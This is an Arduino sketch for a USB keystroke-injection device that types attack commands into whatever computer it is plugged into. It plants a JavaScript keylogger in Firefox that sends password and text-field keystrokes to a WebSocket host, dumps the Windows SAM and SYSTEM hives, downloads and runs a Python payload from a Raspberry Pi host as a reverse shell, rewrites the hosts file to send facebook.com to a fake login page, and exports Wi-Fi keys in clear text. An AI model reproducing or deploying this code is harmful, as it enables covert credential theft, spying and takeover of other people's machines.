//#define SD_MODE
//#define ENABLE_LEDS // To have two different led, one enabled when Arduino is working and another enabled when the injection finish

#include <SPI.h>
#include <SD.h>
#include <Keyboard.h>
//#include <EEPROM.h>

#ifdef SD_MODE
const unsigned int SD_pin = 4;
File manager;
String rule;
#endif

#ifdef ENABLE_LEDS
const unsigned int red_led_pin = 5;
const unsigned int green_led_pin = 6;
#endif

void testKeyboard()
{
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  delay(10);
  Keyboard.releaseAll();
  delay(10);

  Keyboard.end();
}

// Linux
void loadJsKeylogger()
{
  // Firefox
  // TODO: Read keylogger.js content from EEPROM
  Keyboard.begin();
  delay(1000);
  
  Keyboard.press(KEY_LEFT_ALT);
  delay(10);
  Keyboard.press(KEY_F2);
  delay(10);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.println("gnome-terminal");
  delay(10);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.println("unset HISTFILE && cat > \"$(find $HOME/.mozilla/firefox/ -type d -name \"extensions\" | head -n 1)/keylogger.js\" && exit");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(1000);

  // keylogger.js code --> https://github.com/TheCrewman/js-keylogger
  Keyboard.println("function keylogging(e){var n=new WebSocket(\"ws://192.168.1.10:44500\");n.onopen=function(){n.send(e.keyCode)},window.onbeforeunload=function(){n.close()}}if(\"WebSocket\"in window)for(var all_input_fields=document.getElementsByTagName(\"input\"),page_url=document.baseURI,i=0;i<all_input_fields.length;i++)\"text\"!=all_input_fields[i].type.toLowerCase()&&\"password\"!=all_input_fields[i].type.toLowerCase()||all_input_fields[i].addEventListener(\"keydown\",keylogging,all_input_fields[i]);");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  delay(10);
  Keyboard.press('d');
  delay(10);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.end();
}

// Windows
void avoid_powershell_lag()
{
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  
  delay(100);
  
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("taskkill /F /T /IM powershell.exe");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1200);
}

void windows_pass_dump()
{
  Keyboard.begin();
  delay(1000);

  avoid_powershell_lag();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("powershell start-process cmd.exe -verb runAs & exit");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  
  delay(1000);

  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cls");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print("reg save HKLM\\SAM %temp%\\SAM_%computername% & reg save HKLM\\SYSTEM %temp%\\SYSTEM_%computername% & exit");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  Keyboard.end();
}

// BETA --- in testing
void run_reverse_shell()
{
  Keyboard.begin();
  delay(1000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  
  delay(500);

  Keyboard.print("powershell \"$client=New-Object System.Net.WebClient;$path=\\\"$env:TEMP\\prometheus.py\\\";$rpi_ip=\\\"[System.Net.Dns]::GetHostAddresses(\\\"raspberrypi\\\")\\\";$client.DownloadFile(\\\"http://\\\" + $rpi_ip + \\\"/Prometheus_target.py\\\", $path)\" & start /B python %temp%\\prometheus.py");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();

  Keyboard.end();
}

void windows_informations_gathering()
{
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("systeminfo > %temp%\\sys_infos.txt & exit");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();

  Keyboard.end();
}

// BETA -- works only for some Windows versions
void facebook_fake_login()
{
  Keyboard.begin();
  delay(1000);

  avoid_powershell_lag();
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("powershell start-process cmd.exe -verb runAs & exit");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(2250);

  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();

  delay(100);
  
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("type C:\\Windows\\System32\\drivers\\etc\\hosts > %temp%\\hosts.bak");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("python -c \"import socket;print socket.gethostbyname(\\\"raspberrypi\\\")\" > %temp%\\rpi & set /P rpi_ip=<%temp%\\rpi & del %temp%\\rpi");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1000);
  
  Keyboard.print("echo. >> C:\\Windows\\System32\\drivers\\etc\\hosts & echo %rpi_ip%   www.facebook.com >> C:\\Windows\\System32\\drivers\\etc\\hosts");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  /*

  delay(1000);

  Keyboard.print("taskkill /F /T /IM ie.exe & taskkill /F /T /IM chrome.exe & taskkill /F /T /IM firefox.exe & taskkill /F /T /IM opera.exe");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1000);

  */

  delay(1000);

  Keyboard.print("start www.google.com & exit");//type %temp%\\hosts.bak > C:\\Windows\\System32\\drivers\\etc\\hosts & del %temp%\\hosts.bak & exit");
  Keyboard.press(KEY_RETURN);
  delay(1000);
  Keyboard.releaseAll();

  Keyboard.end();
}

void windows_dump_wifi_pass()
{
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("netsh wlan export profile interface=wi-fi key=clear folder=%temp% & exit");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  Keyboard.end();
}

void windows_privilege_escalation()
{
  // ...
}

#ifdef SD_MODE
void select_mode()
{
  manager = SD.open("payload-manager.txt");
  rule = manager.read();

  if (rule == "exec windows_pass_dump")
  {
    windows_pass_dump();
  }
  else if (rule == "exec run_reverse_shell")
  {
    run_reverse_shell();
  }

  manager.close();
}
#endif

void setup()
{  
  #ifdef ENABLE_LEDS
  pinMode(red_led_pin, OUTPUT);
  pinMode(green_led_pin, OUTPUT);
  digitalWrite(red_led_pin, HIGH);
  digitalWrite(green_led_pin, LOW);
  #endif

  pinMode(13, OUTPUT);
  digitalWrite(13, LOW);

  #ifdef SD_MODE
  Serial.begin(9600);
  SD.begin(SD_pin);
  #endif
  
  //testKeyboard();

  loadJsKeylogger();
  //select_mode();
  //windows_informations_gathering();
  //windows_pass_dump();
  //run_reverse_shell();
  //facebook_fake_login();
  //windows_dump_wifi_pass();

  #ifdef ENABLE_LEDS
  digitalWrite(red_led_pin, LOW);
  digitalWrite(green_led_pin, HIGH);
  #endif
}

void loop()
{
  digitalWrite(13, HIGH);
  delay(100);
  digitalWrite(13, LOW);
  delay(100);
}
